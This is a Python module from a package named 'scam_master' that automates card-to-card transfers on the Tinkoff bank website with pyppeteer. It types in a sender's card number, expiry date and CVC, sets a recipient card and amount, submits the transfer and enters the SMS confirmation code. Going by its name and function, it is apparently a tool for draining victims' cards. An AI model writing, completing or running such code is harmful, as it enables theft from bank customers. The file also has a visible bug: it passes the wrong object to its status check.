import asyncio
import math
from pyppeteer import page
from scam_master.banks.errors import UNKNOWN_TRANSFER_STATUS

from scam_master.banks.interface import BankRepositoryInterface
from scam_master.services.models.transactions import Card

from config import config

from loguru import logger

class TinkoffRepository(BankRepositoryInterface):
    @staticmethod
    async def fill_out_transfer_form(browser_page: page.Page, sender_card: Card, recipient_card_number: str, amount_kopeikami: int) -> None:
        try:
            transfer_amount = f"{(amount_kopeikami / 100):.2f}"
            await browser_page.goto(config.tinkoff.URL)
            
            await browser_page.waitForXPath("(//input[@name='cardNumber'])[1]")
            input_element = await browser_page.xpath("(//input[@name='cardNumber'])[1]")
            await input_element[0].type(sender_card.card_number)

            await asyncio.sleep(2)
            await browser_page.waitForSelector("input[name='date']")
            await browser_page.type("input[name='date']", sender_card.expiration_date)
            await asyncio.sleep(2)

            for action in TinkoffRepository._fill_cvc(sender_card.cvc):
                await browser_page.waitForXPath(action)
                action_element = await browser_page.xpath(action)
                await action_element[0].click()

            input_element = await browser_page.xpath("(//input[@name='cardNumber'])[2]")
            await input_element[0].type(recipient_card_number)

            await asyncio.sleep(2)
            transfer_amount = f"{math.floor(amount_kopeikami/100):.2f}"
            await browser_page.type("input[name='moneyAmount']", transfer_amount)
            await asyncio.sleep(2)

            await browser_page.waitForSelector('span[data-qa-file="CommissionDescription"]')
            await asyncio.sleep(2)
            await browser_page.click('button[data-qa-file="SubmitButton"]')
            await asyncio.sleep(2)
        except Exception as e:
            logger.info(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    def _fill_cvc(cvc: str) -> list[str]:
        return [f"//span[@data-value='{char}']" for char in cvc]

    @staticmethod
    async def confirm_transfer(browser_page: page.Page, sms_code: str) -> None:
        try:
            await browser_page.waitForSelector('input[name="password"]')
            await browser_page.type('input[name="password"]', sms_code)
            
            await TinkoffRepository._check_transfer_status(page)
        except Exception:
            raise UNKNOWN_TRANSFER_STATUS
    
    @staticmethod
    async def _check_transfer_status(browser_page: page.Page) -> str:
        try:
            await browser_page.waitForXPath('(//*[@data-qa-file="UIAlertError"] | //div[@data-qa-file="PageTitleContainer"])')
            elements = await browser_page.xpath('(//span[@data-qa-file="UIAlertError" and contains(@class, "ui-alert-error__message")] | //div[@data-qa-file="PageTitleContainer"])')
            
            if elements:
                extracted_text = await browser_page.evaluate('(e) => e.innerText', element=elements[0])
                return extracted_text
        except Exception:
            raise UNKNOWN_TRANSFER_STATUS